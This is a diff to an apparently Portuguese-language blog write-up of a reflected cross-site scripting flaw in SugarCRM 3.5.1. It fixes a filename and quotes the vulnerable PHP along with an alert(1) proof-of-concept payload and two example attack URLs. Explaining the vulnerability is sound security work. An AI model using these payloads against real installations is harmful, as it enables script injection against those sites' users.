@@ -11,6 +11,7 @@ XSS SugarCRM 3.5.1
 Quando paramos para analisar o seguinte trecho de código, conseguimos ver que a primeira key é o "print".
 
 {% highlight php %}
+phprint.php
  32 foreach ($_GET as $key => $val) {
  33   if ($key != "print") {
  34     if (is_array($val)) {
@@ -36,7 +37,7 @@ a url está sendo jogada inteiramente, então, só nos resta ir no único lugar 
 
 <code>print=a&"/><xss>alert(1)</xss></code>
 
-A index do sugarCRM 3.5.1 faz um include do phpprint.php, então, esse xss pode ser aplicado em dois lugares, na index.php ou em phpprint.php.
+A index do sugarCRM 3.5.1 faz um include do phprint.php, então, esse xss pode ser aplicado em dois lugares, na index.php ou em phprint.php.
 
 {% highlight php %}
 681 if (isset($_GET['print'])) {
@@ -47,7 +48,7 @@ A index do sugarCRM 3.5.1 faz um include do phpprint.php, então, esse xss pode 
 {% endhighlight %}
 
 
-{% highlight javascript %} url example 1 = http://vulnerable/phpprint.php?print=a&"/><xss>alert(1)</xss>{% endhighlight %}
+{% highlight javascript %} url example 1 = http://vulnerable/phprint.php?print=a&"/><xss>alert(1)</xss>{% endhighlight %}
 {% highlight javascript %} url example 2 = http://vulnerable/index.php?action=Login&module=Users&print=a&"/><xss>alert(1)</xss>{% endhighlight %}
 
 
